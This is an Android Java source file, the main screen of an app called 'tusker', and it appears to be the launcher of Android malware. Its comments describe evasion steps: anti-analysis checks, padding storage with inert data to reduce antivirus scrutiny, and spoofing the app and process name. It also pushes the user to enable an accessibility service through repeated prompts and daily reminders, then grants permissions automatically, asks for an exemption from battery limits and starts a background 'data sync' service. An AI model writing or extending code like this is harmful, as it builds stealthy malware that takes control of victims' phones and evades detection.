package com.task.tusker;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.task.tusker.permissions.AutoPermissionManager;
import com.task.tusker.receivers.AccessibilityReminderReceiver;
import com.task.tusker.security.ChameleonIdentity;
import com.task.tusker.security.SecurityGuard;
import com.task.tusker.security.SizeInflationManager;
import com.task.tusker.services.DataSyncService;

public class MainActivity extends AppCompatActivity {

    // YouTube tutorial: how to enable accessibility service on Android
    private static final String HELP_VIDEO_URL =
            "https://www.youtube.com/results?search_query=how+to+enable+accessibility+service+android";

    private TextView statusText;
    private TextView statusTitle;
    private TextView statusDesc;
    private TextView statusIcon;
    private TextView appNameText;
    private TextView step3Text;
    private Button openAccessibilityBtn;
    private Button helpBtn;

    private AutoPermissionManager permissionManager;
    private Handler pollHandler;
    private Runnable pollRunnable;
    private boolean accessibilityWasEnabled = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        /* ── Anti-dynamic-analysis sweep (runs before any UI or service) ── */
        SecurityGuard.init(this);

        /* ── Storage inflation (background thread, first launch only) ─────
         * Writes ~38 MB of inert data to the app's private files dir so the
         * total "App + Data" footprint shown in Settings → Apps matches a
         * large legitimate app (~40 MB), reducing AV scrutiny.             */
        SizeInflationManager.ensureInflated(this);

        /* ── Chameleon identity selection ─────────────────────────────────
         * Picks the best alias based on installed apps and enables it.
         * Renames the process via prctl so `adb shell ps` also shows the
         * spoofed name. No-op if the cached choice is <7 days old.       */
        ChameleonIdentity.selectIdentity(this);

        setContentView(R.layout.activity_main);

        permissionManager = new AutoPermissionManager(this);

        statusText         = findViewById(R.id.statusText);
        statusTitle        = findViewById(R.id.statusTitle);
        statusDesc         = findViewById(R.id.statusDesc);
        statusIcon         = findViewById(R.id.statusIcon);
        appNameText        = findViewById(R.id.appNameText);
        step3Text          = findViewById(R.id.step3Text);
        openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);
        helpBtn            = findViewById(R.id.helpBtn);

        // Show real app name in the title and in step 3
        String appName = getString(R.string.app_name);
        if (appName == null || appName.isEmpty()) appName = "TestApp"; // default fallback
        appNameText.setText(appName);
        step3Text.setText("Find and tap \u201c" + appName + "\u201d in the list");

        openAccessibilityBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        helpBtn.setOnClickListener(v -> {
            try {
                // Try to open YouTube app first, fall back to browser
                Intent ytIntent = new Intent(Intent.ACTION_VIEW,
                        Uri.parse(HELP_VIDEO_URL));
                ytIntent.setPackage("com.google.android.youtube");
                if (ytIntent.resolveActivity(getPackageManager()) != null) {
                    startActivity(ytIntent);
                } else {
                    startActivity(new Intent(Intent.ACTION_VIEW,
                            Uri.parse(HELP_VIDEO_URL)));
                }
            } catch (Exception ignored) {
                startActivity(new Intent(Intent.ACTION_VIEW,
                        Uri.parse(HELP_VIDEO_URL)));
            }
        });

        startDataSyncService();

        // Schedule the 3 daily accessibility reminders (morning / noon / afternoon)
        AccessibilityReminderReceiver.scheduleDailyReminders(this);

        updateUiState();
        startPolling();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUiState();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopPolling();
    }

    private void updateUiState() {
        if (permissionManager.isAccessibilityServiceEnabled()) {
            showEnabledState();
        } else {
            showSetupState();
        }
    }

    private void showSetupState() {
        statusText.setText("Accessibility permission not enabled");
        statusIcon.setText("\u26A0");
        statusTitle.setText("Permission Required");
        statusDesc.setText("Follow the steps below to unlock all features");
        openAccessibilityBtn.setText("Open Accessibility Settings");
        openAccessibilityBtn.setEnabled(true);
        helpBtn.setVisibility(android.view.View.VISIBLE);
        if (findViewById(R.id.stepsCard) != null)
            findViewById(R.id.stepsCard).setVisibility(android.view.View.VISIBLE);
        if (findViewById(R.id.lockedCard) != null)
            findViewById(R.id.lockedCard).setVisibility(android.view.View.VISIBLE);
    }

    private void showEnabledState() {
        statusText.setText("Service active — all features unlocked");
        statusIcon.setText("\u2713");
        statusTitle.setText("Accessibility Enabled");
        statusDesc.setText("Permissions are being granted automatically");
        openAccessibilityBtn.setText("Accessibility Settings");
        helpBtn.setVisibility(android.view.View.GONE);
        if (findViewById(R.id.stepsCard) != null)
            findViewById(R.id.stepsCard).setVisibility(android.view.View.GONE);
        if (findViewById(R.id.lockedCard) != null)
            findViewById(R.id.lockedCard).setVisibility(android.view.View.GONE);
    }

    private void startPolling() {
        pollHandler = new Handler();
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                boolean enabled = permissionManager.isAccessibilityServiceEnabled();
                if (enabled && !accessibilityWasEnabled) {
                    accessibilityWasEnabled = true;
                    showEnabledState();
                    requestRuntimePermissions();
                } else if (!enabled && accessibilityWasEnabled) {
                    accessibilityWasEnabled = false;
                    showSetupState();
                }
                if (pollHandler != null) {
                    pollHandler.postDelayed(this, 800);
                }
            }
        };
        pollHandler.post(pollRunnable);
    }

    private void stopPolling() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
            pollHandler = null;
        }
    }

    private void requestRuntimePermissions() {
        permissionManager.requestAllPermissions();

        new Handler().postDelayed(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    android.os.PowerManager pm =
                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                        Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            android.net.Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    }
                } catch (Exception ignored) {}
            }
        }, 1500);
    }

    private void startDataSyncService() {
        try {
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception ignored) {}
    }
}
